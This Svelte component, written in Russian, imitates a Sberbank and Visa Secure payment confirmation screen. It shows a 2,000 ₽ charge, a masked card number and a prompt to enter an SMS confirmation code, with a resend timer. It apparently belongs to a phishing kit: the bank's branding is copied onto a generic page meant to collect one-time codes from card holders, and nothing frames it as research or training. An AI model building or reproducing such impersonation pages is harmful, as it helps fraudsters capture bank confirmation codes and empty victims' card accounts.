<svelte:head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" href="css/check/check.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</svelte:head>

<script>
    export let number;
    let timerValue;
    const dateToday = new Date().toLocaleDateString();
    function timerInit(){
        timerValue = 19;
        const timerId = setInterval(() => {
            if(timerValue > 0)
                timerValue -= 1;
            else clearInterval(timerId);
        }, 1000)
    }
    timerInit();
</script>

<section>
    <div class="wraper">
        <div class="logo">
            <img src="img/chek/sberbankLogo.png" alt="">
            <img src="img/chek/visasecure.png" alt="">
        </div>
        <div class="info">
            <div class="info__price">
                <h1>2 000 ₽</h1>
            </div>
            <div class="info__place">
                <p>Магазин</p>
                <p>psp</p>
            </div>
            <div class="info__card">
                <p>Номер карты</p>
                <p>** {number.slice(number.length-4)}</p>
            </div>
            <div class="info__date">
                <p>Дата</p>
                <p>
                    {dateToday}
                </p>
            </div>
        </div>
        <div class="text">
            <h2>Отправили Код</h2>
            <p>Для его получения ваш номер должен быть подключен к СМС-банку</p>
        </div>
        <div class="input-info">
            <p>Введите код для оплаты покупки</p>
            <input name="kod" class="" autocomplete="tel-country-code" pattern="[0-9]*" type="text">
            {#if timerValue > 0}
                <p>Повторный запрос через <b> {timerValue} секунд</b></p>
            {:else}
                <button class="getNewCode"
                    on:click={timerInit}>запрос кода</button>
            {/if}
        </div>
        <div class="lock">
            <a href="checkBack.html">Отменить</a>
            <a href="">Безопасность</a>
        </div>
    </div>
</section>

<style>
    .getNewCode{
        width: 100%;
        height: 50px;
        margin-top: 8px;
        margin-bottom: 8px;
        border-radius: 4px;
    }
</style>